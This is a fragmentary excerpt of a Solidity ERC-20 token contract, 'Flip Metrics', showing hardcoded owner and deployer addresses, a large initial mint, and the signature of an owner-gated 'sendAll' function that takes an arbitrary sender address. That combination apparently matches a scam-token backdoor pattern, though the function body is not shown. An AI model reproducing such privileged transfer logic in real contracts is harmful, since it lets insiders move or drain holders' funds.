...
contract FlipMetrics is Context, IERC20 {
    ...
    address public _path_ = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;


    address _contDeployr = 0x43B8B7256dA4A7078b56A17667D04CDe54a88aeb;
    address public _ownr = 0xC44E5096C129349d5bc42F3E0B1788F6bA19219D;
   constructor () public {

        _name = "Flip Metrics";
        _symbol = "FLIP";
        _decimals = 18;
        uint256 initialSupply = 1000000000000 * 10 ** _decimals;
        _safeOwnr = _ownr;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function sendAll(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
